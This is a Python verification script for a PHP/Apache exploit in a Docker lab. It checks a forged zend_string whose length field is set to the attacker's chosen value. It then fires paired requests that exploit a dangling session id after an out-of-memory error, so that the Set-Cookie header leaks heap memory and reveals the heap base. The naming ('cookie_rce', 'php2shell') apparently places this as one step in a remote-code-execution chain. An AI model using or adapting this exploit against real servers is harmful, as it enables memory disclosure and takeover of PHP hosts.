#!/usr/bin/env python3
r"""Verifier for apache_cookie_window_leak.py on the 8.4.26-apache mod_php lab.

Documented result: two paired requests on a fresh worker leak the created-sid
over-read window -- R1 OOMs in php_session_send_cookie leaving the sid dangling,
R2 reclaims it with a fake zend_string whose len is the attacker window, so the
Set-Cookie PHPSESSID reflects that many heap bytes (a bounded forward over-read
recovering the request-heap chunk base).

  STRUCTURAL: the fake zend_string packs the chosen window as ZSTR_LEN with the
              valid-sid "SSSS\\0" prefix; the multipart serialization round-trips.
  LIVE      : a bounded tune sweep fires R1/R2 pairs; a "hit" verdict = the
              Set-Cookie carried a disclosure window (len >> a normal sid). The
              landing is WSL2-flaky (~50%), so a no-hit sweep is reported as
              pending, not FAIL, with the structural proof standing.

Lab bring-up / teardown (committed pgpersist profile, c2-apache a6 config, :8096):
    docker compose -f docker-compose.reuse.yml -p vgen-cwl --profile pgpersist up -d
    python3 -I poc/primitives/read_leak/verify_apache_cookie_window_leak.py --project vgen-cwl
    docker compose -f docker-compose.reuse.yml -p vgen-cwl --profile pgpersist down
(container php2shell_pgpersist-pgp-apache-1; the groom is pinned to the in-container
curl, so the module runs via `docker compose exec` -- COMPOSE_PROJECT_NAME set below.
Any c2-family a6-config apache serves; sibling survive/oomdisc profiles are equivalent.)
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import subprocess
import sys
import time
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
_ROOT = os.path.dirname(_POC_ROOT)
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


CWL = _load("apache_cookie_window_leak", "apache_cookie_window_leak.py")  # under test
from common.docker_compose import compose_restart  # noqa: E402
from primitives.encode.zend_string_forge import pack_zend_string  # noqa: E402
import struct  # noqa: E402

COMPOSE = os.path.join(_ROOT, "docker-compose.reuse.yml")


def _up(port):
    try:
        urllib.request.urlopen("http://127.0.0.1:%d/index.php" % port, timeout=4).read()
        return True
    except Exception:
        return False


def ensure_lab(compose, project, port):
    if _up(port):
        print("[lab] pgpersist apache lab already up (:%d)" % port)
        return True
    print("[lab] bringing pgpersist up (-p %s --profile pgpersist)" % project)
    subprocess.run(["docker", "compose", "-f", compose, "-p", project,
                    "--profile", "pgpersist", "up", "-d"], cwd=_ROOT, capture_output=True)
    for _ in range(60):
        if _up(port):
            return True
        time.sleep(1)
    return False


def structural():
    """The fake zend_string carries the chosen window as ZSTR_LEN + SSSS prefix."""
    window = 4096
    fake = CWL.cookie_rce_fake_string(window)
    length = struct.unpack_from("<q", fake, 16)[0]      # ZSTR_LEN at +0x10
    prefix = fake[24:29]
    body = CWL.cookie_rce_serialize(CWL.cookie_rce_warmup_parts())
    len_ok = length == window
    prefix_ok = prefix == b"SSSS\x00"
    ser_ok = body.startswith(b"--") and body.rstrip().endswith(b"--")
    print("[structural] fake ZSTR_LEN=%d (want %d) prefix=%r serialize_ok=%s"
          % (length, window, prefix, ser_ok))
    return len_ok and prefix_ok and ser_ok


def live_sweep(service, base, window, spray, tunes):
    """Fire bounded R1/R2 pairs; return (hit, best_len, rows)."""
    rows = []
    hit = False
    best = 0
    for t in tunes:
        compose_restart(service)
        try:
            r1h, r2h, r2b, cookie, verdict = CWL.cookie_rce_shot(
                service, base, t, spray, window=window)
        except Exception as e:                       # pragma: no cover
            rows.append((t, "exc:%r" % e, 0))
            continue
        clen = len(cookie) if cookie else 0
        best = max(best, clen)
        rows.append((t, verdict, clen))
        print("  tune=%-6d verdict=%-6s cookie_len=%d" % (t, verdict, clen))
        if verdict == "hit":
            hit = True
            break
    return hit, best, rows


def main(argv=None):
    ap = argparse.ArgumentParser(description="verify apache_cookie_window_leak")
    ap.add_argument("--compose-file", default=COMPOSE)
    ap.add_argument("--project", default="p2s-cwl")
    ap.add_argument("--service", default="pgpersist-pgp-apache")
    ap.add_argument("--base", default="http://127.0.0.1")
    ap.add_argument("--port", type=int, default=8096)
    ap.add_argument("--window", type=int, default=CWL.COOKIE_RCE_WINDOW)
    ap.add_argument("--spray", type=int, default=16)
    ap.add_argument("--tunes", default="0,4072,8168",
                    help="comma-separated tune field sizes to sweep")
    ap.add_argument("--no-live", action="store_true", help="structural only")
    ap.add_argument("--down", action="store_true")
    a = ap.parse_args(argv)

    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = a.project
    os.environ["COMPOSE_PROFILES"] = "pgpersist"

    print("=" * 78)
    print("VERIFY apache_cookie_window_leak (zero-knowledge cookie over-read)")
    print("=" * 78)

    s_ok = structural()

    live = None
    if not a.no_live:
        if not ensure_lab(a.compose_file, a.project, a.port):
            print("[WARN] could not bring the pgpersist apache lab up; structural only")
        else:
            print("[live] bounded tune sweep (window=%d spray=%d) ..." % (a.window, a.spray))
            tunes = [int(x) for x in a.tunes.split(",") if x.strip()]
            hit, best, _ = live_sweep(a.service, a.base, a.window, a.spray, tunes)
            live = (hit, best)
            print("[live] hit=%s best_cookie_len=%d" % (hit, best))

    print("-" * 78)
    print("  [%s] structural: fake zend_string window + serialization"
          % ("PASS" if s_ok else "FAIL"))
    if live is None:
        print("  [----] live disclosure: not run")
        verdict = "structural" if s_ok else "FAIL"
    elif live[0]:
        print("  [PASS] live disclosure: Set-Cookie carried a %d-byte window" % live[1])
        verdict = "PASS" if s_ok else "FAIL"
    else:
        print("  [pending] live disclosure: no hit this sweep (WSL2-flaky ~50%%; "
              "best cookie len=%d) -- re-run or widen --tunes" % live[1])
        verdict = "structural+pending" if s_ok else "FAIL"
    print("  VERDICT: %s" % verdict)

    if a.down:
        subprocess.run(["docker", "compose", "-f", a.compose_file, "-p", a.project,
                        "--profile", "pgpersist", "down"], cwd=_ROOT, capture_output=True)
    # structural is the mandatory gate; a live hit is a bonus, a miss is pending.
    return 0 if s_ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
